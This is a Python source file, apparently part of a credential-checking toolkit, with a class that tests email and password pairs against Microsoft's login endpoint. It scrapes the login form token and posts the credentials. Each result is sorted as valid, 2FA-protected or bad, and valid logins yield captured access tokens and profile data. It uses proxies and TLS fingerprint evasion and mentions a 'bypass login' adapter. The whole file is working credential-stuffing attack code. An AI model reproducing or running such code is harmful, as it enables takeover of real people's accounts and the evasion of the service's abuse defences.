"""
Microsoft Base Checker
Uses ms_full_adapter's proven 5-config bypass login for real accuracy.
Falls back to basic PPFT if adapter unavailable.
"""
import re
import logging
import requests
from typing import Tuple, Optional, Dict
from urllib.parse import urlparse, parse_qs

logger = logging.getLogger(__name__)

try:
    from checkers.ms_full_adapter import ms_login_full
    _HAS_ADAPTER = True
except ImportError:
    _HAS_ADAPTER = False


class MicrosoftBase:
    def __init__(self, session=None, timeout: int = 20, proxy: str = None):
        self.timeout  = timeout
        self.proxy    = proxy
        self.proxies  = {'http': proxy, 'https': proxy} if proxy else None
        self.token:   Optional[str] = None
        self.email:   Optional[str] = None
        self.password:Optional[str] = None

        # Use TLS session for anti-fingerprint
        try:
            from core.tls_session import TLSSession
            self.session = TLSSession(proxy=proxy)
        except Exception:
            self.session = session or requests.Session()
            if not session:
                self.session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Accept-Language': 'en-US,en;q=0.9',
                })

    def login(self, email: str, password: str) -> Tuple[bool, str, Optional[str]]:
        """
        Login using full bypass adapter (5 pre-baked configs + Outlook PPFT).
        Returns (success, status, token).
        status: 'SUCCESS' | '2FA' | 'BAD' | 'TIMEOUT' | 'ERROR'
        """
        self.email    = email
        self.password = password

        # Use full adapter for best success rate
        if _HAS_ADAPTER:
            try:
                token = ms_login_full(email, password, self.session,
                                      proxy_fn=None, timeout=self.timeout)
                if token == '2FA':
                    return False, '2FA', None
                if token in ('None', 'ERROR', None, ''):
                    return False, 'BAD' if token == 'None' else 'ERROR', None
                if len(str(token)) > 10:
                    self.token = token
                    return True, 'SUCCESS', token
                return False, 'BAD', None
            except Exception as exc:
                logger.debug(f"Adapter login error for {email}: {exc}")
                # Fall through to basic login

        # Basic fallback login
        return self._basic_login(email, password)

    def _basic_login(self, email: str, password: str) -> Tuple[bool, str, Optional[str]]:
        """Basic PPFT login — fallback only."""
        kw = {'timeout': self.timeout}
        if self.proxies:
            kw['proxies'] = self.proxies

        try:
            r = self.session.get(
                'https://login.live.com/oauth20_authorize.srf',
                params={
                    'client_id':     '00000000402B5328',
                    'response_type': 'token',
                    'scope':         'service::user.auth.xboxlive.com::MBI_SSL',
                    'redirect_uri':  'https://login.live.com/oauth20_desktop.srf',
                },
                allow_redirects=True, **kw
            )
        except requests.exceptions.Timeout:
            return False, 'TIMEOUT', None
        except Exception as exc:
            logger.debug(f"MS basic login step1: {exc}")
            return False, 'ERROR', None

        if r.status_code != 200:
            return False, 'ERROR', None

        ppft = ''
        for pattern in [
            r'name="PPFT".*?value="([^"]+)"',
            r"sFT\s*=\s*'([^']+)",
            r'"sFT":"([^"]+)"',
        ]:
            m = re.search(pattern, r.text)
            if m:
                ppft = m.group(1)
                break

        if not ppft:
            return False, 'ERROR', None

        url_post = 'https://login.live.com/ppsecure/post.srf'
        m = re.search(r"urlPost:'([^']+)", r.text)
        if not m:
            m = re.search(r'"urlPost":"([^"]+)"', r.text)
        if m:
            url_post = m.group(1)

        try:
            r2 = self.session.post(
                url_post,
                data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                allow_redirects=True, **kw
            )
        except requests.exceptions.Timeout:
            return False, 'TIMEOUT', None
        except Exception as exc:
            logger.debug(f"MS basic login step2: {exc}")
            return False, 'ERROR', None

        combined = r2.text.lower() + ' ' + r2.url.lower()

        twofa_signs = [
            'identity/confirm', 'recover?mkt', 'email/confirm', 'abuse?mkt',
            '/proofs', '/otc', 'authenticator', 'proofup', 'fido',
            'remoteconnect', 'verifyidentity', 'suggestedaction',
        ]
        if any(s in combined for s in twofa_signs):
            return False, '2FA', None

        bad_signs = [
            "password is incorrect", "account doesn't exist", "doesn't exist",
            'incorrect account', 'sign in to your microsoft',
            'that microsoft account doesn', 'we could not find',
            'no account found',
        ]
        if any(s in r2.text.lower() for s in bad_signs):
            return False, 'BAD', None

        if '#' in r2.url and 'access_token=' in r2.url:
            frag = parse_qs(urlparse(r2.url).fragment)
            tok  = frag.get('access_token', [None])[0]
            if tok and len(tok) > 10:
                self.token = tok
                return True, 'SUCCESS', tok

        m = re.search(r'access_token=([^&\'">\s]+)', r2.text)
        if m and len(m.group(1)) > 10:
            self.token = m.group(1)
            return True, 'SUCCESS', self.token

        return False, 'BAD', None

    def get_profile_info(self) -> Optional[Dict]:
        if not self.token:
            return None
        kw = {'timeout': self.timeout}
        if self.proxies:
            kw['proxies'] = self.proxies
        try:
            r = self.session.get(
                'https://apis.live.net/v5.0/me',
                headers={'Authorization': f'Bearer {self.token}'},
                **kw
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None
